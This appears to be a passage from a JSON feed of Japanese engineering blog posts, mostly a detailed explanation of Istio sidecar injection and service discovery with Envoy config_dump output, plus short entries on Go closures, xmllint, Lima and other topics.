マニフェストを永続化kube-apiserverは、etcdにPodのマニフェストを永続化します。クライアント ⬅︎ kube-apiserverここで説明するフロー箇所『クライアント ⬅︎ kube-apiserver』の箇所を説明します。(画像はタブ開き閲覧を推奨)(12) コール完了を返信kube-apiserverは、クライアントにレスポンスを受信します。$ kubectl apply -f foo-pod.yaml# kube-apiserverからレスポンスが返ってくるpod \\"foo-pod\\" created以降の仕組み(画像はタブ開き閲覧を推奨)kube-apiserverは、他のNodeコンポーネント (kube-controlleretcd、kube-scheduler、kubeletなど) と通信し、Podを作成します。このPodのマニフェストは、アプリコンテナの他に、istio-proxyコンテナとistio-initコンテナを持ちます。結果として、サイドカーコンテナのistio-proxyコンテナをインジェクションしたことになります。▶ kube-apiserverと他コンポーネントの通信についてKubernetes Master Components: Etcd, API Server, Controller Manager, and Scheduler | by Jorge Acetozi | jorgeacetozi | Medium05. おわりにサービスメッシュの登場とIstioのサイドカーインジェクションの仕組みをもりもり布教しました。Istioへの愛が溢れてしまいました。今回登場したMutatingAdmissionWebhookプラグインに関して、私の関わっているプロダクトではIstio以外 (例：CertManager、Prometheus、AWSのaws-eks-vpc-cniアドオンなど) でも使用しています✌️そのため、MutatingAdmissionWebhookプラグインをどのように使っているのかを一度知れば、知識の汎用性が高いと考えています。サイドカーインジェクションはIstioでも基本的な機能であり、もし未体験の方がいらっしゃれば、お手元でサイドカーコンテナが追加されることを確認していただくとよいかもしれません\uD83D\uDC4D記事関連のおすすめ書籍Istio in Action (English Edition)作者:Posta, Christian E.,Maloku, RinorManningAmazonIstio: Up and Running: Using a Service Mesh to Connect, Secure, Control, and Observe作者:Calcote, Lee,Butcher, ZackO\'Reilly MediaAmazon","isoDate":"2023-01-14T13:38:15.000Z","dateMiliSeconds":1673703495000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"The Diary of fighting with COVID-19? Day-4","link":"https://daisuke1024akagawa.medium.com/the-diary-of-fighting-with-covid-19-day-4-dd2561d21338?source=rss-c54ac439ad2b------2","isoDate":"2023-01-14T11:25:46.000Z","dateMiliSeconds":1673695546000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"The Diary of fighting with COVID-19? Day-3","link":"https://daisuke1024akagawa.medium.com/the-diary-of-fighting-with-covid-19-day-3-fa8a830320d3?source=rss-c54ac439ad2b------2","isoDate":"2023-01-13T13:21:39.000Z","dateMiliSeconds":1673616099000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"xmllint で HTML 内の任意の値を取り出す","link":"https://blog.1q77.com/2023/01/xmllint-html-xpath/","contentSnippet":"サクッと shell script で HTML の中の何かを取り出したい時があります。そんな時に使えるのが xmllint.しっかりやるなら python の Beautiful Soup を使ったりしますが、本当に簡単なことを簡単にやりたい場合に xmllint でサクッとやったメモ。","isoDate":"2023-01-12T14:40:51.000Z","dateMiliSeconds":1673534451000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"The Diary of fighting with COVID-19? Day-2","link":"https://daisuke1024akagawa.medium.com/the-diary-of-fighting-with-covid-19-day-2-59fc403b0fea?source=rss-c54ac439ad2b------2","isoDate":"2023-01-12T13:20:43.000Z","dateMiliSeconds":1673529643000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"The Diary of fighting with COVID-19? Day-1","link":"https://daisuke1024akagawa.medium.com/the-diary-of-fighting-with-covid-19-day-1-3abeaf7e9399?source=rss-c54ac439ad2b------2","isoDate":"2023-01-11T13:35:26.000Z","dateMiliSeconds":1673444126000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"ぼちぼちブログでもはじめます","link":"https://moz-security.hatenablog.com/entry/2023/01/04/111143","contentSnippet":"もう新年始まって気づいたら４日目ですが、明けましておめでとうございます。アウトプットの場として2023年になり、気持ちを新たにして、なにか新しいことを始めようと思ったときに、前々からいつかやろうと思っていたブログを書くことに決めました。（いつかやろうを今やることは大事だと思う。）ここらへんで、一応、自己紹介しておきたいと思います。私は、現在、大学で情報理工学を学んでいて、ネットワークやセキュリティに興味を持っています。今までやってきたこととしては、B2のときに基本情報技術者試験、B3のときに応用情報技術者試験に合格し、他には、セキュリティ・ミニキャンプ オンライン・東京 に参加したり、Hack The Boxを少しずつやってきました。（秋学期になってからHTBはほとんど触れていないが…）他にも、いろんな勉強会にも参加してきました。今はオンラインで気軽に参加できるので。ブログを書こうかなと考えた理由は大きく３つありまして。１つ目は、セキュリティ・ミニキャンプのグループ活動でLT大会をしたときに、やっぱりアウトプットの場というのがあることで、より知識の定着につながることが実感できたからです。大学生になってからは、インプットがメインになっていてアウトプットの場がなかなかないため、どうアウトプットするのかというのは考える必要がありました。Twitterでもアウトプットはできるし、実際にそれを使っていましたが、文字数に制限があるため、正しく文章を書くには向いていません。（気楽にツイートできることがTwitterの良さではあるのですが。）２つ目は、自分の言語化能力の向上のためです。自分の頭には考えがあるのに、それをうまく伝えられなかったり、わかりにくい説明になっていたりしていたため、どうすればわかりやすく説明できるのかというのは前からの悩みでした。そこでいろいろ考えたときに自分の頭にあることを言語化するというのは、結構慣れの要素が大きいと思うため、経験を積むことが大事だという結論にいたり、それならば、早く始めた方がいいというのが、ブログを書くきっかけにもなっています。３つ目は、エンジニアになるなら、自分の技術力（今までどんなことをやってきたのか、私はどんなことができるのか）を証明するためにも技術ブログは書いておくといいということを聞くことが多いからです。今は、いきなり技術ブログを書くのは敷居が高いため、気楽に書けるこのHatena Blogでしか記事を書いていませんが、今年中には、QitaやZennの方に、技術系の記事を投稿していきたいと思っています。ブログを書く前に、Hatena Blogを使うかも結構迷っていて、自分で個人ブログサイトを作ろうかとも思ったのですが、そこに時間をかける前にさっさとブログを書き始めようということで、こちらを選択しました。そのため、今年中には、個人のブログサイトを作ってそちらに移行したいと思っています。（願望）このHatena Blogでは、月に１回は投稿していく予定です。内容としては、その月にやってきたこととか新たな発見があったこと、自分の書きたいことを勝手に発信していく感じで。ここであらかじめ宣言しておくことで、自分を追い込んでいくスタイル。（笑）技術的な話は、QiitaやZennの方に書くかもしれませんが、もしかしたら、こっちで書くかもしれません。全然考えていないため、そこら辺はこれから考えていきたいと思います。とりあえず、人生初めてのブログは、こんな感じで終わりたいと思います。近々、新年の抱負として、今年やりたいことを書きたいと思っています。","isoDate":"2023-01-04T02:11:43.000Z","dateMiliSeconds":1672798303000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"Lima の vmType VZ と virtiofs を試す","link":"https://blog.1q77.com/2022/12/lima-vz/","contentSnippet":"Lima が version 0.14.0 で QEMU だけではなく macOS の Virtualization.Framework に対応していました。vmtype という設定項目が増えています。この新しい Framework では Host のディレクトリをマウントするのに virtiofs が使えるようになっており、QEMU での reverse-sshfs や 9p よりもパフォーマンスが良いらしいので試してみます。","isoDate":"2022-12-29T15:49:47.000Z","dateMiliSeconds":1672328987000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"クロージャーのメモリ割り当てについて(Go言語)","link":"https://kechigon.hatenablog.com/entry/2022/12/29/203946","contentSnippet":"A Tour of GoでGo言語に入門していて、クロージャーのメモリ割り当てについて疑問に思ったので調べた。クロージャーとはA Tour of Go での説明をまとめると、本体の外部から変数を参照する関数値関数は、参照した変数にアクセスして割り当てることができるという特徴がある。サンプルコードpackage mainimport \\"fmt\\"func adder() func() int {    sum := 0    return func() int {        sum++        return sum    }}func main() {    f := adder()    for i := 0; i < 10; i++ {        fmt.Println(f())    }}出力12345678910adder 関数はクロージャーを返し、各クロージャーは、sum 変数にバインドされている。疑問点サンプルコードではクロージャーが、adder関数で定義されたsum変数を参照、割り当てしてる。しかし、関数呼び出しといえばスタックフレームを用いるイメージしかない私にとっては、sum変数の参照がどこに残っているのか疑問。おそらくヒープ領域に割り当てられてる？GitHub issue でのやり取り調べたところ、同じ疑問に答えているissueを見つけた。質問者は、同じような処理をクロージャーを使用する場合と使用しない場合で試している。そして、クロージャーを使用した場合だとヒープ領域への割り当てが行われると言っている。実際のコードpackage mainimport (    \\"fmt\\"    \\"sync\\"    \\"testing\\")type Object struct {}var p sync.Pool = sync.Pool{    New: func() interface{} {        return &Object{}    },}type Func struct {    ctx interface{}}func (this *Func) Run() {    p.Put(this.ctx)  }func RunWithFunc() Func {    ctx := p.Get()    return Func{ctx: ctx}}func RunWithClosure() func() {    ctx := p.Get()    return func() { p.Put(ctx) }}func Test1() {    cleanup := RunWithFunc()    cleanup.Run()}func Test2() {    cleanup := RunWithClosure()    cleanup()}func main() {    f1 := testing.AllocsPerRun(1000, Test1)    f2 := testing.AllocsPerRun(1000, Test2)    // 0    fmt.Println(f1)    // 1    fmt.Println(f2)}コードの詳しい内容は、クロージャーを使わないRunWithFuncと使用するRunWithClosureを実行する。どちらも大雑把に言うと、空の構造体をsync.Poolから取り出したり戻したりする。クロージャーを使うとヒープ領域への割り当てが行われることをtesting.AllocsPerRunが示す。といった感じ。回答者は以下のように言っている。問題は、RunWithClosure がクロージャーを返す必要があることです。関数が実行される前にスタック フレームがなくなるため、スタックに割り当てることができません。 可能な場合は、スタックにクロージャーを割り当てます。スタック上にクロージャ（これらの2つのフィールドの匿名構造体）を割り当て、呼び出された関数にそれらへのポインタを渡すことができますし、実際に行っています。ここでの問題は、その構造体がRunWithClosureの内部で割り当てられ、RunWithClosureのフレームは、cleanupを呼び出すまでになくなってしまうことです。そのため、RunWithClosureのフレームでクロージャを割り当てることはできません。それは、ヒープ上に割り当てられなければなりません。もし、RunWithClosureをその呼び出し元にインライン化すれば、そのスタック・フレームが十分に長く生きるので、呼び出し元でクロージャを割り当てることができるようになります。クロージャーが実行される前に、参照先をもつスタックフレームがなくなってしまう場合、それをヒープ領域に割り当てるらしい。またそれを避けたい場合は、関数になっている部分をインライン化するといいらしい。まとめGo言語に入門していて、クロージャーが参照している変数がどこに残っているか疑問に思ったが、GitHub issueのやり取りから、予想した通り、ヒープ領域への割り当てが行われていることがわかった。","isoDate":"2022-12-29T11:39:46.000Z","dateMiliSeconds":1672313986000,"authorName":"Kurita Keigo","authorId":"kurita"},{"title":"rbspy で ruby の stacktrace を flamegraph にする","link":"https://blog.1q77.com/2022/12/rbspy/","contentSnippet":"中身をよく知らない Rails アプリでどこが遅いのかな？と思って rbspy (github) を試してみたのでメモ。とりあえず使って flamegraph を書き出してみたんだけどそもそも flamegraph がどういうものなのか分かってなくて困ったのでドキュメントを読んでみた。","isoDate":"2022-12-28T11:26:10.000Z","dateMiliSeconds":1672226770000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Professional Cloud Security Engineer の振り返り","link":"https://qiita.com/dirtymosschan/items/2c66eec7919220a4ec06","contentSnippet":"はじめに2022/12/28 に Google Cloud Certification の１つである、Professional Cloud Security Engineer に合格したので、そちらの振り返りをしようと思います。こちらの記事では、出題内容の詳細は記載し...","isoDate":"2022-12-28T08:57:17.000Z","dateMiliSeconds":1672217837000,"authorName":"Yu Kaneko","authorId":"mos914"},{"title":"【Istio⛵️】Istioのサービス間通信を実現するサービスディスカバリーの仕組み","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2022/12/25/060000","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️サービスディスカバリーの種類についてIstioのサービス間通信を実現するサービスディスカバリーの仕組みについて記事のざっくりした内容は、以下のスライドからキャッチアップできちゃいます！    この記事から得られる知識01. はじめに02. サービスディスカバリーについてマイクロサービスアーキテクチャにおけるサービスディスカバリーサービスディスカバリーとはなぜサービスディスカバリーが必要なのかサービスディスカバリーの要素サービスディスカバリーのパターンサービスディスカバリーのパターンとはサーバーサイドパターンクライアントサイドパターン03. Istioのサービスディスカバリーの仕組み全体像(1) kube-apiserverによる宛先情報保管(2) discoveryコンテナによる宛先情報保管(3) istio-proxyコンテナによる宛先情報取得(4) istio-proxyコンテナによるリクエスト受信(5) istio-proxyコンテナによるロードバランシングdiscoveryコンテナの仕組み(1) kube-apiserverによる宛先情報保管(2) discoveryコンテナによる宛先情報保管(3) istio-proxyコンテナによる宛先情報取得istio-proxyコンテナの仕組み(1) kube-apiserverによる宛先情報保管(2) discoveryコンテナによる宛先情報保管(3) istio-proxyコンテナによる宛先情報取得(4) istio-proxyコンテナによるリクエスト受信(5) istio-proxyコンテナによるリクエスト受信04. istio-proxyコンテナ内のEnvoyの仕組み全体像(1) 送信元マイクロサービスからリクエスト受信(2) Envoyによるリスナー選択(3) Envoyによるルート選択(4) Envoyによるクラスター選択(5) Envoyによるエンドポイント選択(6) 宛先マイクロサービスへのリクエスト送信EnvoyがADS-APIから取得した宛先情報を見てみようconfig_dumpエンドポイントリスナー▼ 確認方法▼ 結果ルート▼ 確認方法▼ 結果クラスター▼ 確認方法▼ 結果エンドポイント▼ 確認方法▼ 結果Envoyの処理の流れのまとめ(1) 送信元マイクロサービスからリクエスト受信(2) Envoyによるリスナー選択(3) Envoyによるルート選択(4) Envoyによるクラスター選択(5) Envoyによるクラスター選択(6) 宛先マイクロサービスへのリクエスト送信05. おわりに謝辞記事関連のおすすめ書籍01. はじめに推し (Istio) が尊い\uD83D\uDE4F\uD83D\uDE4F\uD83D\uDE4F3-shake Advent Calender 2022 最終日の記事です\uD83C\uDF85普段、私は 俺の技術ノート に知見を記録しており、はてなブログはデビュー戦となります。最近の業務で、オンプレとAWS上のIstio⛵️をひたすら子守りしています。今回は、子守りの前提知識の復習もかねて、Istioのサービス間通信を実現するサービスディスカバリーの仕組みを記事で解説しました。Istioの機能の1つであるサービスディスカバリーは、その仕組みの多くをEnvoyに頼っているため、合わせてEnvoyの仕組みも説明します。それでは、もりもり布教していきます\uD83D\uDE1702. サービスディスカバリーについてマイクロサービスアーキテクチャにおけるサービスディスカバリーサービスディスカバリーとは平易な言葉で言い換えると サービス間通信 です。マイクロサービスアーキテクチャでは、マイクロサービスからマイクロサービスにリクエストを送信する場面があります。サービスディスカバリーとは、宛先マイクロサービスの宛先情報 (例：IPアドレス、完全修飾ドメイン名など) を検出し、送信元マイクロサービスが宛先マイクロサービスにリクエストを継続的に送信可能にする仕組みのことです。なぜサービスディスカバリーが必要なのかそもそも、なぜサービスディスカバリーが必要なのでしょうか。マイクロサービスアーキテクチャでは、システムの信頼性 (定められた条件下で定められた期間にわたり、障害を発生させることなく実行する程度) を担保するために、マイクロサービスのインスタンスの自動スケーリングを採用します。この時、自動スケーリングのスケールアウトでマイクロサービスが増加するたびに、各インスタンスには新しい宛先情報が割り当てられてしまいます。また、マイクロサービスが作り直された場合にも、宛先情報は更新されてしまいます。このように、たとえインスタンスの宛先情報が更新されたとしても、インスタンスへのリクエストに失敗しない仕組みが必要です。サービスディスカバリーの要素サービスディスカバリーの仕組みは、次の要素からなります。名前解決は、DNSベースのサービスディスカバリー (例：CoreDNS + Service + kube-proxyによるサービスディスカバリー) で必要となり、Istioでは使いません。そのため、本記事では言及しないこととします\uD83D\uDE47\uD83C\uDFFB‍ 要素                    責務                                                              送信元マイクロサービス  リクエストを送信する。                                            宛先マイクロサービス    リクエストを受信する。                                            サービスレジストリ      宛先マイクロサービスの宛先情報を保管する。                        ロードバランサー        宛先マイクロサービスのインスタンスにロードバランシングする。      名前解決                宛先マイクロサービスへのリクエスト送信時に、名前解決可能にする。 サービスディスカバリーのパターンサービスディスカバリーのパターンとはサービスディスカバリーの実装方法にはいくつか種類があります。Istioのサービスディスカバリーは、このうちのサーバーサイドパターンを実装したものになります。サーバーサイドパターン送信元マイクロサービスから、問い合わせとロードバランシングの責務が切り離されています。送信元マイクロサービスは、ロードバランサーにリクエストを送信します。ロードバランサーは、宛先マイクロサービスの場所をサービスレジストリに問い合わせ、またリクエストをロードバランシングする責務を担っています\uD83D\uDCAA\uD83C\uDFFB(例) Istio、Linkerd、CoreDNS、AWS ALBなどCloud Native Patterns: Designing change-tolerant software (English Edition)Pattern: Server-side service discoveryクライアントサイドパターン通信の送信元マイクロサービスは、宛先マイクロサービスの場所をサービスレジストリに問い合わせ、さらにロードバランシングする責務を担います。(例) NetflixのEureka、kube-proxyなどCloud Native Patterns: Designing change-tolerant software (English Edition)Pattern: Client-side service discoveryService Discovery in Kubernetes: Combining the Best of Two Worlds03. Istioのサービスディスカバリーの仕組みIstioが実装するサービスメッシュには、サイドカープロキシメッシュとアンビエントメッシュがあり、今回はサイドカープロキシメッシュのサービスディスカバリーを取り上げます。Istioのサービスディスカバリーは、discoveryコンテナとistio-proxyコンテナが軸となり、サーバーサイドパターンのサービスディスカバリーを実装します。全体像(1) 〜 (6) の全体像は、以下の通りです\uD83D\uDC47istio-proxyコンテナは、サービスレジストリへの問い合わせと、ロードバランシングする責務を担っていることに注目してください。(1) kube-apiserverによる宛先情報保管kube-apiserverは、Pod等の宛先情報をetcd等に保管します。これは、Kubernetesの通常の仕組みです。(2) discoveryコンテナによる宛先情報保管discoveryコンテナは、kube-apiserverからPod等の宛先情報を取得し、自身に保管します。(3) istio-proxyコンテナによる宛先情報取得istio-proxyコンテナは、discoveryコンテナからPod等の宛先情報を双方向ストリーミングRPCで取得します。(4) istio-proxyコンテナによるリクエスト受信送信元マイクロサービスがリクエストを送信します。サーバーサイドパターンでの責務通り、送信元マイクロサービスはロードバランサー (ここではistio-proxyコンテナ) にリクエストを送信します。この時、送信元マイクロサービスがistio-proxyコンテナに直接的にリクエストを送信しているというよりは、iptablesがistio-proxyコンテナにリクエストをリダイレクトします。istio-proxyコンテナこれを受信します。(5) istio-proxyコンテナによるロードバランシングistio-proxyコンテナは、リクエストをロードバランシングし、また宛先Podに送信します。Istio in ActionJimmy SongTech-赵化冰的博客 | Zhaohuabing Blogdiscoveryコンテナの仕組み全体像の中から、discoveryコンテナを詳しく見てみましょう。discoveryコンテナは、別名Istiodと呼ばれています。XDS-APIというエンドポイントを公開しており、XDS-APIのうち、サービスディスカバリーに関係するAPIは以下の通りです。今回は詳しく言及しませんが、istio-proxyコンテナがHTTPSリクエストを処理するために、証明書を配布するためのSDS-APIもあります。 APIの種類  説明                                                   LDS-API    Envoyのリスナーを取得できる。                          RDS-API    Envoyのルートを取得できる。                            CDS-API    Envoyのクラスターを取得できる。                        EDS-API    Envoyのエンドポイントできる。                          ADS-API    各XDS-APIから取得できる宛先情報を整理して取得できる。 Istio in Action(1) kube-apiserverによる宛先情報保管kube-apiserverによる宛先情報保管 と同じです。(2) discoveryコンテナによる宛先情報保管discoveryコンテナによる宛先情報保管 と同じです。(3) istio-proxyコンテナによる宛先情報取得XDS-APIとistio-proxyコンテナの間では、gRPCの双方向ストリーミングRPCの接続が確立されています。そのため、istio-proxyコンテナからのリクエストに応じて宛先情報を返却するだけでなく、リクエストがなくとも、XDS-APIからもistio-proxyコンテナに対して宛先情報を送信します。XDS-APIのエンドポイントがいくつかあり、各エンドポイントから宛先情報を取得できます。一方で、各エンドポイントからバラバラに宛先情報を取得すると、Envoy上でこれを整理する時に、宛先情報のバージョンの不整合が起こる可能性があります。そのため、Istioは実際にはADS-APIを使用して宛先情報を取得します。istio-proxyコンテナの仕組み全体像の中から、istio-proxyコンテナを詳しく見てみましょう。Istio in ActionJimmy SongTech-赵化冰的博客 | Zhaohuabing Blog(1) kube-apiserverによる宛先情報保管kube-apiserverによる宛先情報保管 と同じです。(2) discoveryコンテナによる宛先情報保管discoveryコンテナによる宛先情報保管 と同じです。(3) istio-proxyコンテナによる宛先情報取得istio-proxyコンテナでは、pilot-agentとEnvoyが稼働しています。先ほどistio-proxyコンテナは、双方向ストリーミングRPCでADS-APIから宛先情報を取得すると説明しました。厳密にはEnvoyが、pilot-agentを介して、ADS-APIから双方向ストリーミングRPCで宛先情報を取得します。(4) istio-proxyコンテナによるリクエスト受信istio-proxyコンテナによるリクエスト受信 と同じです。(5) istio-proxyコンテナによるリクエスト受信EnvoyはADS-APIから取得した宛先情報に基づいて、宛先マイクロサービスのインスタンスにロードバランシングします。04. istio-proxyコンテナ内のEnvoyの仕組み全体像EnvoyがADS-APIから取得した宛先情報を見ていく前に、Envoyの処理の流れを解説します。istio-proxyコンテナ内のEnvoyでは、以下の仕組みでHTTPリクエストを処理します。(1) 〜 (6) の全体像は、以下の通りです\uD83D\uDC47Istio in Action (English Edition)Istio: Up and Running: Using a Service Mesh to Connect, Secure, Control, and ObserveArchitecture Analysis of Istio: The Most Popular Service Mesh Project - Alibaba Cloud Community(1) 送信元マイクロサービスからリクエスト受信istio-proxyコンテナは、送信元マイクロサービスからリクエストを受信します。(2) Envoyによるリスナー選択Envoyは、リクエストの宛先情報 (例：宛先IPアドレス、ポート番号、パス、ホストなど) に応じてリスナーを選びます。(3) Envoyによるルート選択Envoyは、リスナーに紐づくルートを選びます。▶ TCPリクエストを処理する場合についてDebugging Your Debugging Tools: What to do When Your Service Mesh Goes Down | PPT(4) Envoyによるクラスター選択Envoyは、クラスターに紐づくクラスターを選びます。(5) Envoyによるエンドポイント選択Envoyは、クラスターに紐づくエンドポイントを選びます。(6) 宛先マイクロサービスへのリクエスト送信Envoyは、エンドポイントに対応するインスタンスにリクエストを送信します。Envoyで確認した宛先情報を\uD83D\uDC46に当てはめて見ていくことにしましょう。EnvoyがADS-APIから取得した宛先情報を見てみようconfig_dumpエンドポイント実際にEnvoyに登録されている宛先情報は、istio-proxyコンテナ自体のlocalhost:15000/config_dumpからJSON形式で取得できます。もしお手元にIstioがある場合は、Envoyにどんな宛先情報が登録されているか、Envoyを冒険してみてください。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump\\" | yq -P▶ 宛先情報を見やすくするyqコマンドについてyqコマンドでYAMLに変換すると見やすくなります\uD83D\uDC4Dリスナー▼ 確認方法istio-proxyコンテナがADS-APIから取得したリスナーは、/config_dump?resource={dynamic_listeners}から確認できます。ここでは、foo-pod内でbar-podのリスナーを確認したと仮定します。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_listeners}\\" | yq -P▼ 結果以下を確認できました。宛先IPアドレスや宛先ポート番号に応じてリスナーを選べるようになっており、ここでは<任意のIPアドレス>:50002。リスナーに紐づくルートの名前configs:  - \\"@type\\": type.googleapis.com/envoy.admin.v3.ListenersConfigDump.DynamicListener    # リスナー名    name: 0.0.0.0_50002    active_state:      version_info: 2022-11-24T12:13:05Z/468      listener:        \\"@type\\": type.googleapis.com/envoy.config.listener.v3.Listener        name: 0.0.0.0_50002        address:          socket_address:            # 受信したパケットのうちで、宛先IPアドレスでフィルタリング            address: 0.0.0.0            # 受信したパケットのうちで、宛先ポート番号でフィルタリング            port_value: 50002        filter_chains:          - filter_chain_match:              transport_protocol: raw_buffer              application_protocols:                - http/1.1                - h2c            filters:              - name: envoy.filters.network.http_connection_manager                typed_config:                  \\"@type\\": type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager                  stat_prefix: outbound_0.0.0.0_50001                  rds:                    config_source:                      ads: {}                      initial_fetch_timeout: 0s                      resource_api_version: V3                    # 本リスナーに紐づくルートの名前                    route_config_name: 50002  ...  - \\"@type\\": type.googleapis.com/envoy.admin.v3.ListenersConfigDump.DynamicListener  ...Administration interface — envoy 1.32.0-dev-bfa0e0 documentationConfigDump (proto) — envoy 1.32.0-dev-bfa0e0 documentationルート▼ 確認方法istio-proxyコンテナがADS-APIから取得したリスナーは、/config_dump?resource={dynamic_route_configs}から確認できます。ここでは、foo-pod内でbar-podのルートを確認したと仮定します。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_route_configs}\\" | yq -P▼ 結果コマンドを実行するとYAMLを取得でき、以下を確認できました。リスナーを取得した時に確認できたルートの名前リクエストのパスやHostヘッダーに応じてルートを選べるようになっているルートに紐づくクラスターの名前configs:  - \\"@type\\": type.googleapis.com/envoy.admin.v3.RoutesConfigDump.DynamicRouteConfig    version_info: 2022-11-24T12:13:05Z/468    route_config:      \\"@type\\": type.googleapis.com/envoy.config.route.v3.RouteConfiguration      # ルートの名前      name: 50002      virtual_hosts:        - name: bar-service.bar-namespace.svc.cluster.local:50002          # ホストベースルーティング          domains:            - bar-service.bar-namespace.svc.cluster.local            - bar-service.bar-namespace.svc.cluster.local:50002            - bar-service            - bar-service:50002            - bar-service.bar-namespace.svc            - bar-service.bar-namespace.svc:50002            - bar-service.bar-namespace            - bar-service.bar-namespace:50002            - 172.16.0.2            - 172.16.0.2:50002          routes:            - match:                # パスベースルーティング                prefix: /              route:                # 本ルートに紐づくクラスターの名前                cluster: outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local                timeout: 0s                retry_policy:                  retry_on: connect-failure,refused-stream,unavailable,cancelled,retriable-status-codes                  num_retries: 2                  retry_host_predicate:                    - name: envoy.retry_host_predicates.previous_hosts                  host_selection_retry_max_attempts: \\"5\\"                  retriable_status_codes:                    - 503                max_stream_duration:                  max_stream_duration: 0s                  grpc_timeout_header_max: 0s              decorator:                operation: bar-service.bar-namespace.svc.cluster.local:50002/*  ...  - \'@type\': type.googleapis.com/envoy.admin.v3.RoutesConfigDump.DynamicRouteConfig  ...Administration interface — envoy 1.32.0-dev-bfa0e0 documentationConfigDump (proto) — envoy 1.32.0-dev-bfa0e0 documentationクラスター▼ 確認方法istio-proxyコンテナがADS-APIから取得したクラスターは、/config_dump?resource={dynamic_active_clusters}から確認できます。ここでは、foo-pod内でbar-podのクラスターを確認したと仮定します。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_active_clusters}\\" | yq -P▼ 結果コマンドを実行するとYAMLを取得でき、以下を確認できました。ルートを取得した時に確認できたクラスターの名前クラスターに紐づくエンドポイントの親名configs:  - \\"@type\\": type.googleapis.com/envoy.admin.v3.ClustersConfigDump.DynamicCluster    version_info: 2022-11-24T12:13:05Z/468    cluster:      \\"@type\\": type.googleapis.com/envoy.config.cluster.v3.Cluster      # クラスターの名前      name: outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local      type: EDS      eds_cluster_config:        eds_config:          ads: {}          initial_fetch_timeout: 0s          resource_api_version: V3        # 本クラスターに紐づくエンドポイントの親名        service_name: outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local  ...  - \\"@type\\": type.googleapis.com/envoy.admin.v3.ClustersConfigDump.DynamicCluster  ...Administration interface — envoy 1.32.0-dev-bfa0e0 documentationConfigDump (proto) — envoy 1.32.0-dev-bfa0e0 documentationエンドポイント▼ 確認方法istio-proxyコンテナがADS-APIから取得したクラスターは、/config_dump?include_edsから確認できます。ここでは、foo-pod内でbar-podのクラスターを確認したと仮定します。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?include_eds\\" | yq -P▼ 結果コマンドを実行するとYAMLを取得でき、以下を確認できました。クラスターを取得した時に確認できたエンドポイントの親名bar-podのインスタンスが3個あるため、3個のエンドポイントがありますconfigs:  dynamic_endpoint_configs:    - endpoint_config:        \\"@type\\": type.googleapis.com/envoy.config.endpoint.v3.ClusterLoadAssignment        # エンドポイントの親名        cluster_name: outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local        endpoints:          - locality:              region: ap-northeast-1              zone: ap-northeast-1a            lb_endpoints:              - endpoint:                  address:                    socket_address:                      # 冗長化されたbar-podのIPアドレス                      address: 11.0.0.1                      # bar-pod内のコンテナが待ち受けているポート番号                      port_value: 50002                  health_check_config: {}                health_status: HEALTHY                metadata:                  filter_metadata:                    istio:                      workload: bar                    envoy.transport_socket_match:                      tlsMode: istio                # ロードバランシングアルゴリズムを決める数値                load_balancing_weight: 1          - locality:              region: ap-northeast-1              zone: ap-northeast-1d            lb_endpoints:              - endpoint:                  address:                    socket_address:                      # 冗長化されたbar-podのIPアドレス                      address: 11.0.0.2                      # bar-pod内のコンテナが待ち受けているポート番号                      port_value: 50002                  health_check_config: {}                health_status: HEALTHY                metadata:                  filter_metadata:                    istio:                      workload: bar                    envoy.transport_socket_match:                      tlsMode: istio                # ロードバランシングアルゴリズムを決める数値                load_balancing_weight: 1          - locality:              region: ap-northeast-1              zone: ap-northeast-1d            lb_endpoints:              - endpoint:                  address:                    socket_address:                      # 冗長化されたbar-podのIPアドレス                      address: 11.0.0.3                      # bar-pod内のコンテナが待ち受けているポート番号                      port_value: 50002                  health_check_config: {}                health_status: HEALTHY                metadata:                  filter_metadata:                    istio:                      workload: bar                    envoy.transport_socket_match:                      tlsMode: istio                # ロードバランシングアルゴリズムを決める数値                load_balancing_weight: 1        policy:          overprovisioning_factor: 140    ...    - endpoint_config:    ...Administration interface — envoy 1.32.0-dev-bfa0e0 documentationConfigDump (proto) — envoy 1.32.0-dev-bfa0e0 documentation▶ Envoyの負荷分散方式についてload_balancing_weightキー値が等しい場合、EnvoyはP2Cアルゴリズムに基づいてロードバランシングします\uD83D\uDC4DEnvoyの処理の流れのまとめ確認できた宛先情報を、Envoyの処理の流れに当てはめてみました。(1) 送信元マイクロサービスからリクエスト受信送信元マイクロサービスは、宛先マイクロサービス (<任意のIP>/:50002) にリクエストを送信します。サイドカーコンテナのistio-proxyコンテナはこれを受信します。(2) Envoyによるリスナー選択Envoyは、リクエストの宛先 (IPアドレス、ポート番号、パス) からPodのリスナー (0.0.0.0_50002) を選びます。(3) Envoyによるルート選択Envoyは、リスナーに紐づくPodのルート (50002) を選びます。(4) Envoyによるクラスター選択Envoyは、クラスターに紐づくPodのクラスター (outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local) を選びます。(5) 